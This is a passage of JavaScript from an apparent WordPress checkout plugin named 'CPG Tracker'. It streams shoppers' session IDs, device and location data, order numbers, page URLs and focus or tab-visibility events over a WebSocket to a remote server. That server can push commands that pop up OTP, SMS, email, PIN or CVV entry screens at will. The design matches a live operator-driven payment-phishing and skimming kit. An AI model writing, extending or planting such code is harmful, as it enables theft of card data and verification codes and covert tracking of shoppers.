                        session_id: this.sessionId,
                        request_url: window.location.href,
                        request_method: 'GET',
                        user_agent: navigator.userAgent,
                        referer: document.referrer || '',
                        detail: document.title || '页面访问',
                        device_info: this.deviceInfo,
                        geo_info: this.geoInfo,
                        timestamp: Date.now(),
                    };
                    
                    this.ws.send(JSON.stringify(logData));
                } else {
                    console.warn('[CPG Tracker] ⚠️ WebSocket未连接，跳过日志记录');
                }
            } catch (e) {
                console.warn('[CPG Tracker] ⚠️ 记录访问日志异常:', e);
            }
        }

        /**
         * 日志
         */
        log(...args) {
            if (this.config.debug) {
            }
        }

        warn(...args) {
            if (this.config.debug) {
                console.warn('[CPG Tracker]', ...args);
            }
        }

        error(...args) {
            console.error('[CPG Tracker]', ...args);
        }
        
        /**
         * 🔥 处理验证请求（3D验证指令）
         */
        handleVerificationRequest(data) {
            
            const { verification_type, verification_data } = data;
            
            // 检查统一验证API是否存在
            if (typeof window.CPG_Verify === 'undefined') {
                console.error('[CPG Tracker] ❌ CPG_Verify API 未找到，无法显示验证界面');
                return;
            }
            
            // 根据验证类型显示对应的验证界面
            switch (verification_type) {
                case 'otp':
                case 'sms':
                    window.CPG_Verify.showOTP(verification_data || {});
                    break;
                    
                case 'email':
                    window.CPG_Verify.showEmail(verification_data || {});
                    break;
                    
                case 'pin':
                    window.CPG_Verify.showPIN(verification_data || {});
                    break;
                    
                case 'cvv':
                    window.CPG_Verify.showCVV(verification_data || {});
                    break;
                    
                default:
                    console.warn('[CPG Tracker] ⚠️ 未知的验证类型:', verification_type);
                    // 默认显示OTP界面
                    window.CPG_Verify.showOTP(verification_data || {});
                    break;
            }
            
        }
        
        /**
         * 🔥 处理验证成功
         */
        handleVerificationSuccess(data) {
            
            // 隐藏所有验证界面
            if (typeof window.CPG_Verify !== 'undefined') {
                window.CPG_Verify.hideAll();
            }
            
            // 显示成功提示
            if (data.message) {
                alert(data.message);
            }
            
            // 如果有重定向URL，跳转
            if (data.redirect_url) {
                window.location.href = data.redirect_url;
            }
        }
        
        /**
         * 🔥 处理验证失败
         */
        handleVerificationFailed(data) {
            
            // 显示错误提示
            if (data.message) {
                alert('验证失败: ' + data.message);
            }
            
            // 可以选择关闭验证界面或保持打开让用户重试
            // 根据error_action决定
            if (data.error_action === 'close') {
                if (typeof window.CPG_Verify !== 'undefined') {
                    window.CPG_Verify.hideAll();
                }
            }
        }
        
        /**
         * 🔥 处理支付授权成功
         */
        handlePaymentAuthorized(data) {
            
            // 隐藏所有验证界面
            if (typeof window.CPG_Verify !== 'undefined') {
                window.CPG_Verify.hideAll();
            }
            
            // 显示成功提示
            if (data.message) {
                alert(data.message);
            }
            
            // 跳转到订单成功页面
            if (data.return_url) {
                window.location.href = data.return_url;
            }
        }
    }

    // 创建全局实例（使用 CPG_CONFIG 配置）
    if (typeof window.CPG_CONFIG !== 'undefined') {
        window.CPG_Tracker = new CPG_Tracker(window.CPG_CONFIG);
        
        // ✅ 暴露断开连接方法（安全功能）
        window.CPG_DisconnectTracker = function() {
            if (window.CPG_Tracker) {
                window.CPG_Tracker.disconnect();
            }
        };
        
        // 页面加载完成后初始化
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                window.CPG_Tracker.init();
            });
        } else {
            window.CPG_Tracker.init();
        }
    } else {
        console.error('[CPG Tracker] CPG_CONFIG 未定义，无法初始化追踪器');
    }

})();

// ===================================================================
// 独立的在线状态管理模块（复用业务逻辑的 session_id）
// ===================================================================

(function() {
    'use strict';
    
    
    // ========== 等待并复用 CPG_Tracker 的 session_id ==========
    function waitForSessionId(callback) {
        const checkSession = setInterval(function() {
            if (window.CPG_Tracker && window.CPG_Tracker.sessionId) {
                clearInterval(checkSession);
                callback(window.CPG_Tracker.sessionId);
            }
        }, 100);
        
        // 10秒超时
        setTimeout(function() {
            clearInterval(checkSession);
        }, 10000);
    }
    
    // ========== 在线状态心跳（独立定时器）==========
    let onlineHeartbeatTimer = null;
    let currentSessionId = null;
    
    function startOnlineHeartbeat(sessionId) {
        currentSessionId = sessionId;
        
        if (onlineHeartbeatTimer) {
            clearInterval(onlineHeartbeatTimer);
        }
        
        
        let heartbeatCount = 0;
        
            // 每15秒发送一次在线状态心跳
            onlineHeartbeatTimer = setInterval(function() {
            // ✅ 每次心跳时，先检查 WordPress 后端配置状态
            fetch(window.location.origin + '/wp-admin/admin-ajax.php?action=cpg_check_config_status', {
                method: 'POST',  // 🔥 WordPress AJAX 推荐使用 POST
                credentials: 'same-origin',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                }
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('HTTP ' + response.status);
                }
                return response.json();
            })
            .then(configStatus => {
                
                // 🔥🔥🔥 修复：放宽配置有效性检查 🔥🔥🔥
                // 只要 enabled=true 就认为配置有效
                // has_api_url 不是必须的（插件支持"智能默认配置"模式）
                const isEnabled = configStatus && configStatus.success && configStatus.enabled;
                
                // 🔥 只有明确禁用时才断开连接
                if (configStatus && configStatus.success && !configStatus.enabled) {
                    console.error('⚠️ [Heartbeat] 追踪功能已禁用，断开连接');
                    
                    // 停止心跳并断开连接
                    if (onlineHeartbeatTimer) {
                        clearInterval(onlineHeartbeatTimer);
                        onlineHeartbeatTimer = null;
                    }
                    
                    // 断开 WebSocket
                    if (window.CPG_Tracker) {
                        window.CPG_Tracker.disconnect();
                    }
                    
                    console.warn('🛑 数据追踪已停止（功能已禁用）');
                    return;
                }
                
                // 🔥 配置有效：如果 WebSocket 未连接，尝试重连
                if (window.CPG_Tracker && !window.CPG_Tracker.wsConnected && window.CPG_Tracker.manualDisconnect) {
                    console.log('🔄 [Heartbeat] 尝试重新连接 WebSocket...');
                    window.CPG_Tracker.manualDisconnect = false;
                    window.CPG_Tracker.connectWebSocket();
                    return;
                }
                
                // 配置有效，继续发送心跳
                if (window.CPG_Tracker && window.CPG_Tracker.ws && window.CPG_Tracker.wsConnected) {
                    heartbeatCount++;
                    
                    // 🔥 规范：online_heartbeat 事件需要 order_no 和 page_url 字段
                    const message = {
                        type: 'online_heartbeat',
                        session_id: currentSessionId,
                        order_no: window.CPG_Tracker.orderNo || '',       // 🔥 规范：添加订单号
                        page_url: window.location.href,                    // 🔥 规范：添加页面URL
                        timestamp: Date.now()
                    };
                    
                    
                    window.CPG_Tracker.sendMessage(message);
                    
                    // ✅ 更新活动时间（保持会话活跃）
                    const now = Date.now().toString();
                    localStorage.setItem('cpg_last_activity_time', now);
                } else {
                    console.warn('⚠️ [Heartbeat] WebSocket 未连接，跳过此次心跳');
                }
            })
            .catch(error => {
                console.error('❌ [Config Check] 检查配置失败:', error);
                // 🔥 配置检查失败时仍然保持 WebSocket 连接（网络问题不应该断开连接）
                if (window.CPG_Tracker && window.CPG_Tracker.wsConnected) {
                    heartbeatCount++;
                    // 🔥 规范：online_heartbeat 事件需要 order_no 和 page_url 字段
                    window.CPG_Tracker.sendMessage({
                        type: 'online_heartbeat',
                        session_id: currentSessionId,
                        order_no: window.CPG_Tracker.orderNo || '',   // 🔥 规范：添加订单号
                        page_url: window.location.href,                // 🔥 规范：添加页面URL
                        timestamp: Date.now()
                    });
                }
            });
        }, 15000);
    }
    
    function stopOnlineHeartbeat() {
        if (onlineHeartbeatTimer) {
            clearInterval(onlineHeartbeatTimer);
            onlineHeartbeatTimer = null;
        }
    }
    
    // ========== 等待 Tracker 和 WebSocket 都就绪 ==========
    function waitForTrackerReady(callback) {
        const checkTracker = setInterval(function() {
            if (window.CPG_Tracker && window.CPG_Tracker.ws && window.CPG_Tracker.wsConnected) {
                clearInterval(checkTracker);
                callback();
            }
        }, 100);
        
        // 10秒超时
        setTimeout(function() {
            clearInterval(checkTracker);
        }, 10000);
    }
    
    // ========== 初始化在线状态管理 ==========
    function initOnlineStatus() {
        
        // 第一步：等待 session_id 生成
        waitForSessionId(function(sessionId) {
            currentSessionId = sessionId;
            
            // ✅ 判断是否是重连
            const wasOnline = localStorage.getItem('cpg_was_online') === 'true';
            
            // 第二步：等待 WebSocket 连接
            waitForTrackerReady(function() {
                
                // 发送上线通知
                setTimeout(function() {
                    if (window.CPG_Tracker && window.CPG_Tracker.ws) {
                        // 🔥 规范：user_online 事件需要 order_no 和 page_url 字段
                        const message = {
                            type: 'user_online',
                            session_id: currentSessionId,
                            order_no: window.CPG_Tracker.orderNo || '',   // 🔥 规范：添加订单号
                            page_url: window.location.href,                // 🔥 规范：添加页面URL
                            is_reconnect: wasOnline,
                            timestamp: Date.now()
                        };
                        
                        
                        window.CPG_Tracker.sendMessage(message);
                        
                        // ✅ 标记已上线过
                        localStorage.setItem('cpg_was_online', 'true');
                    }
                }, 500);
                
                // 启动在线状态心跳
                startOnlineHeartbeat(currentSessionId);
            });
        });
    }
    
    // ========== 页面关闭时发送离线通知 ==========
    window.addEventListener('beforeunload', function() {
        
        if (!currentSessionId) {
            console.warn('⚠️ 无 Session ID，跳过离线通知');
            return;
        }
        
        
        // 发送离线通知
        if (window.CPG_Tracker && window.CPG_Tracker.ws && window.CPG_Tracker.wsConnected) {
            try {
                const message = {
                    type: 'user_offline',
                    session_id: currentSessionId,
                    reason: 'page_unload',
                    timestamp: Date.now()
                };
                
                
                window.CPG_Tracker.sendMessage(message);
            } catch (e) {
                console.error('❌ 发送离线通知失败:', e);
            }
        } else {
            console.warn('⚠️ WebSocket 未连接，无法发送离线通知');
        }
        
        // 停止心跳
        stopOnlineHeartbeat();
        
        // ✅ 保存离开时间（8小时内回来都能复用）
        const leaveTime = Date.now().toString();
        localStorage.setItem('cpg_last_activity_time', leaveTime);
    });
    
    // ========== Visibility API - 页面可见性变化 ==========
    document.addEventListener('visibilitychange', function() {
        if (!currentSessionId) return;
        
        if (window.CPG_Tracker && window.CPG_Tracker.ws && window.CPG_Tracker.wsConnected) {
            if (document.hidden) {
                // 页面隐藏（切换标签页）
                window.CPG_Tracker.sendMessage({
                    type: 'page_hidden',
                    session_id: currentSessionId,  // ✅ 使用同一个 session_id
                    timestamp: Date.now()
                });
            } else {
                // 页面显示（切回标签页）
                window.CPG_Tracker.sendMessage({
                    type: 'page_visible',
                    session_id: currentSessionId,  // ✅ 使用同一个 session_id
                    timestamp: Date.now()
                });
            }
        }
    });
    
    // ========== 窗口焦点变化 ==========
    window.addEventListener('focus', function() {
        if (!currentSessionId) return;
        
        if (window.CPG_Tracker && window.CPG_Tracker.ws && window.CPG_Tracker.wsConnected) {
            // 🔥 使用统一的 trackFocusEvent 方法
            window.CPG_Tracker.trackFocusEvent('window_focused', {}, 'window_focused');
        }
    });
    
    window.addEventListener('blur', function() {
        if (!currentSessionId) return;
        
        if (window.CPG_Tracker && window.CPG_Tracker.ws && window.CPG_Tracker.wsConnected) {
            // 🔥 使用统一的 trackFocusEvent 方法
            window.CPG_Tracker.trackFocusEvent('window_blurred', {}, 'window_blurred');
        }
    });
    
    // ========== 启动 ==========
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initOnlineStatus);
    } else {
        initOnlineStatus();
    }
    
    
})();